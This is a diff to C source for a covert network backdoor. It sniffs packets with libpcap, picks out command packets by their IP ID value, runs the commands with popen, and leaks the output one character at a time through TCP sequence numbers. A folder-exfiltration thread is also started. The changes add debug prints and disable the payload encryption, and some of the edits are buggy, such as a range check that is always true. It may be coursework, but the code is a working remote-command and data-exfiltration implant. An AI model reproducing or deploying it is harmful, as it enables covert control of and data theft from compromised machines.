@@ -57,7 +57,7 @@ void pcap_init(uint32 ipaddr, char *folder, int chan) {
 	expack.folder = folder;
 	pthread_create(&exfil_thread, NULL, exfil_watch, &expack);
 
-	if ((nic = pcap_open_live(NULL, MAX_LEN, 0, -1, errbuf)) == NULL)
+	if ((nic = pcap_open_live(NET_DEVICE, MAX_LEN, 0, -1, errbuf)) == NULL)
 		error(errbuf);
 
 // Get packet fltr_str from arguments
@@ -93,16 +93,16 @@ void pkt_handler(u_char *user, const struct pcap_pkthdr *pkt_info,
 		error("pkt_handler(): Truncated IP Header");
 
 	// check if the packet is intended for the backdoor server
-	if (iphdr->id != 5001)
-		return;
-
-	switch (iphdr->protocol) {
-	case IPPROTO_TCP:
-		handle_tcp(user, pkt_info, packet);
-		break;
-	case IPPROTO_UDP:
-		handle_udp(user, pkt_info, packet);
-		break;
+	if (ntohs(iphdr->id) >= 5000 || ntohs(iphdr->id) <= 5050) {
+		switch (iphdr->protocol) {
+		case IPPROTO_TCP:
+			printf("protocol TCP");
+			handle_tcp(user, pkt_info, packet);
+			break;
+		case IPPROTO_UDP:
+			handle_udp(user, pkt_info, packet);
+			break;
+		}
 	}
 
 }
@@ -114,25 +114,29 @@ void handle_tcp(u_char *user, const struct pcap_pkthdr *pkt_info,
 	int size_tcp, ip_len;
 	char *tcp_payload, *decrypt_payload;
 
+	tcp_payload = malloc(sizeof(char *));
+
 	iphdr = (struct iphdr*) (packet + sizeof(struct ether_header));
 	ip_len = iphdr->ihl * 4;
 
-	tcphdr = (struct tcphdr*) (packet + ip_len);
+	tcphdr = (struct tcphdr*) (packet + sizeof(struct ether_header) + ip_len);
 	size_tcp = tcphdr->doff * 4;
 
 	if (size_tcp < TCP_HDR_SIZ)
 		error("handle_tcp(): invalid TCP size");
 
 	// retrieves the TCP payload
-	tcp_payload = (char *) (packet + ip_len + size_tcp);
+	tcp_payload = (char *) (packet + sizeof(struct ether_header) + ip_len
+			+ size_tcp);
 
-	decrypt_payload = malloc(sizeof(char *));
+	//decrypt_payload = malloc(sizeof(char *));
 
 	// decrypt the payload and copy it into decrypt_payload variable.
-	decrypt(SEKRET, tcp_payload, sizeof(tcp_payload));
-	memcpy(decrypt_payload, tcp_payload, strlen(tcp_payload));
+	//decrypt(SEKRET, tcp_payload, sizeof(tcp_payload));
+	//memcpy(decrypt_payload, tcp_payload, strlen(tcp_payload));
+	printf("PAYLOAD => %s", tcp_payload);
 
-	cmd_execute(decrypt_payload, iphdr->daddr, ip_addr);
+	cmd_execute(tcp_payload, iphdr->daddr, ip_addr);
 }
 
 void handle_udp(u_char *user, const struct pcap_pkthdr *pkt_info,
@@ -145,7 +149,7 @@ void handle_udp(u_char *user, const struct pcap_pkthdr *pkt_info,
 	iphdr = (struct iphdr*) (packet + sizeof(struct ether_header));
 	ip_len = iphdr->ihl * 4;
 
-	udphdr = (struct udphdr*) (iphdr + ip_len);
+	udphdr = (struct udphdr*) (iphdr + sizeof(struct ether_header) + ip_len);
 	size_udp = sizeof(struct udphdr);
 
 	if (size_udp < UDP_HDR_SIZ)
@@ -158,12 +162,12 @@ void handle_udp(u_char *user, const struct pcap_pkthdr *pkt_info,
 	decrypt_payload = malloc(sizeof(char *));
 
 	// decrypt the payload and copy it into decrypt_payload variable.
-	decrypt(SEKRET, udp_payload, sizeof(udp_payload));
+	//decrypt(SEKRET, udp_payload, sizeof(udp_payload));
 	memcpy(decrypt_payload, udp_payload, strlen(udp_payload));
 
-	printf("UDP PAYLOAD = %s", decrypt_payload);
+	printf("UDP PAYLOAD = %s", udp_payload);
 
-	cmd_execute(decrypt_payload, iphdr->daddr, ip_addr);
+	cmd_execute(udp_payload, iphdr->daddr, ip_addr);
 }
 
 void cmd_execute(char *command, uint32 src, uint32 ip) {
@@ -173,6 +177,8 @@ void cmd_execute(char *command, uint32 src, uint32 ip) {
 	char *trans;
 	int tot_len, i = 0, j = 0;
 
+	printf("Command => %s\n", command);
+
 	memset(line, 0, MAX_LEN);
 	memset(resp, 0, MAX_LEN);
 
@@ -180,19 +186,26 @@ void cmd_execute(char *command, uint32 src, uint32 ip) {
 	fp = popen(command, "r");
 
 	// Append line by line output into response buffer
-	while (fgets(line, MAX_LEN, fp) != NULL)
+	while (fgets(line, MAX_LEN, fp) != NULL) {
 		strcat(resp, line);
+		printf("line =>  %s\n", line);
+	}
 
 	tot_len = strlen(resp) + 1;
 
-	trans = malloc(sizeof(char *));
-	strncpy(trans, resp, tot_len);
+	trans = (char *) malloc(tot_len);
+
+	memcpy(trans, resp, tot_len);
+
+	printf("Response Len => %d\n", tot_len);
+
+	//strncpy(trans, resp, tot_len);
 
 	for (i = 0; i < tot_len; i += 8) {
 		char frame[FRAM_SZ];
 		char *ptr;
 		int fram_len;
-		uint32 tcp_seq;
+		char tcp_seq;
 
 		ptr = trans + i;
 
@@ -202,14 +215,15 @@ void cmd_execute(char *command, uint32 src, uint32 ip) {
 		memcpy(frame, ptr, fram_len);
 
 		// encrypt the frame of 8 characters
-		encrypt(SEKRET, frame, FRAM_SZ);
+//encrypt(SEKRET, frame, FRAM_SZ);
 
 		// go through the frame and send 1 character at a time
 		// in the TCP sequence field.
 
 		for (j = 0; j < FRAM_SZ; ++j) {
-			tcp_seq = DEF_SEQ;
-			tcp_seq += frame[j]; // adding to the default sequence number
+			//tcp_seq = DEF_SEQ;
+			//tcp_seq += frame[j]; // adding to the default sequence number
+			/*REMOVE THIS*/tcp_seq = frame[j];
 
 			usleep(SLEEP_TIME); // sleep for specific amount of time
 			_send(src, ip, tcp_seq, RSP_TYP); // send the packet as a response packet
